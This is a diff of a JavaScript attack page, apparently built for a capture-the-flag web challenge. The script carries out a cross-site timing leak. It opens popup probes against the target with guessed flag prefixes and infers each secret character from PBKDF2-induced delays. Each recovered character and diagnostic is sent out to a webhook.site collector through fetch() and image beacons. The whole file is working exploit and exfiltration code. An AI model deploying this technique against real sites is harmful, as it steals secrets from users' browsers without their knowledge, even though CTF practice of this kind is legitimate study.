@@ -1,116 +1,100 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
+// v4 diagnostic + full charset
 var T="https://svfgp.breakable.live";
 var W="https://webhook.site/75654f85-ce75-4c03-b50d-4fc4cc161800";
-var THR=2500;
 var known="CTF{";
-var HEX="0123456789abcdef";
-var PROBE_TIMEOUT=8000;
+var CHARS="abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-!}";
+var PROBE_TIMEOUT=12000;
 
 function exfil(d){
   var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
-  try{fetch(u,{mode:"no-cors",cache:"no-store"}).catch(function(){});}catch(e){}
-  try{var i=new Image();i.src=u+"&x=1";}catch(e){}
+  try{fetch(u,{mode:"no-cors",cache:"no-store"});}catch(e){}
+  try{new Image().src=u+"&x=1";}catch(e){}
 }
 
-exfil("LOADED_v3");
+exfil("LOADED_v4");
 
-function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
-
-function probe(cand,idx){
+function probe(q){
   return new Promise(function(res){
-    var sid="s"+Date.now()+"-"+idx;
-    var rid="r"+Math.random().toString(36).slice(2);
-    var u=T+"/?mode=probe&q="+encodeURIComponent(cand)+"&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
+    var sid="s"+Date.now()+"-"+Math.random().toString(36).slice(2,8);
+    var rid="r"+Math.random().toString(36).slice(2,8);
+    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
+      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
     var t0=Date.now();
+    var wname="p_"+Math.random().toString(36).slice(2,8);
     var w;
-    try{w=window.open(u,"probe_"+idx);}catch(e){exfil("ERR_OPEN:"+e.message);res({c:cand.slice(-1),t:0,err:"open_throw"});return;}
-    if(!w){exfil("ERR_NULL_WIN:idx="+idx);res({c:cand.slice(-1),t:0,err:"null_win"});return;}
+    try{w=window.open(url,wname);}catch(e){res({q:q,t:0,src:"open_err"});return;}
+    if(!w){res({q:q,t:0,src:"null_win"});return;}
     var done=false;
-    function finish(ms,src){
-      if(done)return;done=true;
-      try{w.close();}catch(e){}
-      res({c:cand.slice(-1),t:ms,src:src});
-    }
+    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:ms,src:src});}
     function handler(e){
       if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
         window.removeEventListener("message",handler);
-        finish(Date.now()-t0,"msg");
+        fin(Date.now()-t0,"msg");
       }
     }
     window.addEventListener("message",handler);
-    setTimeout(function(){
-      window.removeEventListener("message",handler);
-      finish(Date.now()-t0,"timeout");
-    },PROBE_TIMEOUT);
+    setTimeout(function(){window.removeEventListener("message",handler);fin(Date.now()-t0,"timeout");},PROBE_TIMEOUT);
   });
 }
 
-async function probeChar(prefix,ch,idx){
-  var r=await probe(prefix+ch,idx);
-  await sleep(200);
-  return r;
-}
-
-async function findCharBatch(prefix){
-  var chars=prefix.length>=4+64?["}"]:HEX.split("");
-  var results=[];
-  var batch=4;
-  for(var i=0;i<chars.length;i+=batch){
-    var slice=chars.slice(i,i+batch);
-    var proms=slice.map(function(c,j){return probeChar(prefix,c,i+j);});
-    var batchRes=await Promise.all(proms);
-    results=results.concat(batchRes);
-  }
-  results.sort(function(a,b){return b.t-a.t;});
-  var top3=results.slice(0,3).map(function(r){return r.c+"="+r.t+"ms("+r.src+")";}).join(",");
-  exfil("P"+(prefix.length-4)+":"+top3);
-  var msgResults=results.filter(function(r){return r.src==="msg";});
-  if(msgResults.length>0){
-    msgResults.sort(function(a,b){return b.t-a.t;});
-    if(msgResults[0].t>THR){
-      exfil("MSG_HIT:"+msgResults[0].c+"="+msgResults[0].t+"ms");
-      return msgResults[0].c;
-    }
-    if(msgResults.length>1){
-      var diff=msgResults[0].t-msgResults[1].t;
-      if(diff>1000){
-        exfil("MSG_DIFF:"+msgResults[0].c+"="+diff+"ms");
-        return msgResults[0].c;
-      }
-    }
-  }
-  if(results[0].t>THR&&results[0].src==="timeout"){
-    var allTimeout=results.every(function(r){return r.src==="timeout";});
-    if(allTimeout){
-      exfil("ALL_TIMEOUT:nomsg");
-      return null;
-    }
-  }
-  if(results[0].t>THR){
-    return results[0].c;
-  }
-  return null;
-}
-
 async function run(){
-  exfil("START_v3:"+known);
-  var info="opener="+(window.opener?"yes":"no")+",popups=";
-  try{var tw=window.open("about:blank","_test_");info+=tw?"ok":"null";try{tw.close();}catch(e){}}catch(e){info+="err";}
-  exfil("INFO:"+info);
-  while(!known.endsWith("}")){
-    if(known.length===4+64){known+="}";break;}
-    var ch=null;
-    var tries=0;
-    while(!ch&&tries<3){
-      ch=await findCharBatch(known);
-      tries++;
-      if(!ch)exfil("RETRY:"+(prefix.length-4)+"_try:"+tries);
-    }
-    if(!ch){exfil("STUCK:"+known);break;}
-    known+=ch;
-    exfil("F:"+known);
+  exfil("START_v4:"+known);
+
+  // DIAGNOSTIC: probe "CTF{" which MUST match if flag starts with CTF{
+  var d1=await probe("CTF{");
+  exfil("DIAG_CTF_BRACE:"+d1.t+"ms("+d1.src+")");
+
+  // DIAGNOSTIC: probe nonsense - should NOT match
+  var d2=await probe("ZZZZZ");
+  exfil("DIAG_NONSENSE:"+d2.t+"ms("+d2.src+")");
+
+  // If CTF{ didn't trigger PBKDF2 (< 2s), localStorage might be empty
+  if(d1.t < 2000 && d1.src==="msg"){
+    exfil("WARN:no_pbkdf2_for_CTF_brace_localStorage_may_be_empty");
   }
+
+  // Now test chars one by one sequentially
+  var results=[];
+  for(var i=0;i<CHARS.length;i++){
+    var ch=CHARS[i];
+    var r=await probe(known+ch);
+    results.push({c:ch,t:r.t,src:r.src});
+    // If we get a slow msg response (PBKDF2 ran), this is our char
+    if(r.src==="msg" && r.t>2000){
+      exfil("HIT_POS0:"+ch+"="+r.t+"ms");
+      known+=ch;
+      exfil("FOUND:"+known);
+      break;
+    }
+    // Report every 10 chars
+    if((i+1)%10===0){
+      var batch=results.slice(i-9,i+1).map(function(x){return x.c+"="+x.t;}).join(",");
+      exfil("BATCH"+(i+1)+":"+batch);
+    }
+  }
+
+  // If we found first char, continue finding more
+  if(known.length>4){
+    while(known.length < 4+64+1){
+      if(known.length===4+64){known+="}";exfil("FOUND:"+known);break;}
+      var found=false;
+      for(var i=0;i<CHARS.length;i++){
+        var ch=CHARS[i];
+        var r=await probe(known+ch);
+        if(r.src==="msg" && r.t>2000){
+          known+=ch;
+          exfil("FOUND:"+known);
+          found=true;
+          break;
+        }
+      }
+      if(!found){exfil("STUCK_AT:"+known);break;}
+    }
+  }
+
   exfil("DONE:"+known);
 }
+
 setTimeout(run,500);
 </script></body></html>
